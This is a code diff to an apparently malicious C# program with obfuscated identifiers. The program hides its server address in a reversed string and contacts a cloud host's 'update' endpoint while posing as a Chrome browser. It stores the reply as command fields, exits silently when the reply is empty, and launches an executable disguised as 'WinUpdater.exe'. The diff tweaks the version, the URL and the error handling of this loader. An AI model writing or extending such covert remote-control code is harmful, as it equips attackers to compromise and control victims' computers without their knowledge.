@@ -30,7 +30,7 @@ namespace iruwd7
             }
         }
 
-        static string v = "0";
+        static string v = "1";
     
 
         Process process = new Process();
@@ -231,8 +231,10 @@ namespace iruwd7
             
             try
             {
-                ChUp();
                 
+                // Thread chup = new Thread(ChUpStr);
+                // chup.Start();
+                ChUp();
             }
             catch (Exception)
             {
@@ -282,6 +284,17 @@ namespace iruwd7
             Environment.Exit(0);
 
         }
+        public void ChUpStr()
+        {
+            try
+            {
+                ChUp();
+            }
+            catch(Exception)
+            {
+
+            }
+        }
 
         public void ChUp()
         {
@@ -292,8 +305,9 @@ namespace iruwd7
                 //ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
                 //ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
 
-                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(RversedStr("Aetadpu/resu/vded/moc=ppaukoreh=duolc-rellortnoci//:sptthAAAA")));
+                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(RversedStr("etadpu/resu/vded/moc=ppaukoreh=duolc-rellortnoci//:ptthAAA")));
 
+                
                 req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
                 req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36";
                 req.Headers.Add("Accept-Encoding", "gzip, deflate, br");
@@ -308,10 +322,8 @@ namespace iruwd7
             }
             catch (Exception)
             {
-               
+                
             }
-
-            
 
            
             string[] sps = { "***" };
@@ -379,11 +391,12 @@ namespace iruwd7
 
                 responseString = File.ReadAllText(Path.Combine(UF, "resstr.txt"));
                 
+                if (responseString.Length < 10)
+                    Environment.Exit(0);
+
                 string[] sps = { "***" };
                 string[] data = responseString.Split(sps, 4, StringSplitOptions.RemoveEmptyEntries);
-
-
-
+                
 
                 Thread.Sleep(TimeSpan.FromSeconds(10));
 
@@ -568,7 +581,7 @@ namespace iruwd7
 
             Thread.Sleep(TimeSpan.FromSeconds(1));
             strerr = "";
-            //StartPro(Path.Combine(MF, "explorer.exe"));
+           
             try
             {
                 Process.Start(Path.Combine(MF, "WinUpdater.exe"));
